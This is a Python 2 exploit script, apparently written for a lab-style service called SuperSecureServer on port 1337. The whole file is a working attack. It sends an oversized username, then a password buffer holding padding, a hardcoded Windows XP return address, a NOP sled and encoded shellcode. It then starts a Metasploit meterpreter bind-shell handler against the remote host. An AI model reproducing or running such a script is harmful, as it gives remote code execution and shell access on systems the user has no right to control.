#!/usr/bin/env python
#################################
# 
#  SuperSecureServer Exploit
#  By Moloch
#
#################################

import os
import sys
import time
import socket

if len(sys.argv) == 1:
	print '[!] No rhost'
	sys.exit()

#### Setup all of our variables ###
HOST = sys.argv[1]
PORT = 1337

offset = 494
ret = '\xf7\x56\x44\x7e' # User32.dll 0x7E4456F7, adjust for non-xp machines

shellcode = "\xda\xd3\xba\x7c\xa9\xda\xb9\xd9\x74\x24\xf4\x5e\x31\xc9" + \
"\xb1\x4b\x31\x56\x19\x83\xee\xfc\x03\x56\x15\x9e\x5c\x26" + \
"\x51\xd7\x9f\xd7\xa2\x87\x16\x32\x93\x95\x4d\x36\x86\x29" + \
"\x05\x1a\x2b\xc2\x4b\x8f\xb8\xa6\x43\xa0\x09\x0c\xb2\x8f" + \
"\x8a\xa1\x7a\x43\x48\xa0\x06\x9e\x9d\x02\x36\x51\xd0\x43" + \
"\x7f\x8c\x1b\x11\x28\xda\x8e\x85\x5d\x9e\x12\xa4\xb1\x94" + \
"\x2b\xde\xb4\x6b\xdf\x54\xb6\xbb\x70\xe3\xf0\x23\xfa\xab" + \
"\x20\x55\x2f\xa8\x1d\x1c\x44\x1a\xd5\x9f\x8c\x53\x16\xae" + \
"\xf0\x3f\x29\x1e\xfd\x3e\x6d\x99\x1e\x35\x85\xd9\xa3\x4d" + \
"\x5e\xa3\x7f\xd8\x43\x03\x0b\x7a\xa0\xb5\xd8\x1c\x23\xb9" + \
"\x95\x6b\x6b\xde\x28\xb8\x07\xda\xa1\x3f\xc8\x6a\xf1\x1b" + \
"\xcc\x37\xa1\x02\x55\x92\x04\x3b\x85\x7a\xf8\x99\xcd\x69" + \
"\xed\x9b\x8f\xe5\xc2\x91\x2f\xf6\x4c\xa2\x5c\xc4\xd3\x18" + \
"\xcb\x64\x9b\x86\x0c\x8a\xb6\x7e\x82\x75\x39\x7e\x8a\xb1" + \
"\x6d\x2e\xa4\x10\x0e\xa5\x34\x9c\xdb\x69\x65\x32\xb4\xc9" + \
"\xd5\xf2\x64\xa1\x3f\xfd\x5b\xd1\x3f\xd7\xf3\x20\x1b\x8b" + \
"\x93\x40\x9b\x3d\x38\xcd\x7d\x57\xd0\x9b\xd6\xc0\x12\xf8" + \
"\xee\x77\x6c\x2b\x43\x2f\xfa\x64\x8d\xf7\x05\x75\x9b\x5b" + \
"\xa9\xde\x4c\x28\xa1\xdb\x6d\x2f\xec\x4c\xf9\xb8\x7a\x1c" + \
"\x48\x58\x7a\x35\x38\x9a\xee\xb1\xeb\xcd\x86\xbb\xca\x3a" + \
"\x09\x44\x39\x31\x80\xd0\x82\x2e\xed\x34\x03\xaf\xbb\x5e" + \
"\x03\xc7\x1b\x3a\x50\xf2\x63\x97\xc4\xaf\xf1\x17\xbd\x1c" + \
"\x51\x7f\x43\x7a\x95\x20\xbc\xa9\x27\x1d\x6b\x94\xad\x57" + \
"\x19\xf4\x6d"

username = "A" * 500
evil_passwd = ("A" * offset) + ret + ("\x90" * 25) + shellcode

### Let the evil begin >:) ###
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
print '[*] Connecting to remote host %s:%d' % (HOST, PORT)
sock.connect((HOST, PORT))
time.sleep(0.5)
data = sock.recv(1024)
print '[*] Received banner; %d bytes' % len(data)
time.sleep(0.5)
print '[*] Sending garbage user name; %d bytes' % len(username)
sock.send(username + "\r\n")
data = sock.recv(1024)
print '[*] Received password challenge; %d bytes' % len(data)
time.sleep(0.5)
print '[*] Sending evil password buffer; %d bytes' % len(evil_passwd)
sock.send(evil_passwd + "\r\n") 
print '[$] Dropp\'in a shell, please wait...'
os.system("sudo msfcli exploit/multi/handler RHOST=%s PAYLOAD=windows/meterpreter/bind_tcp E" % HOST)

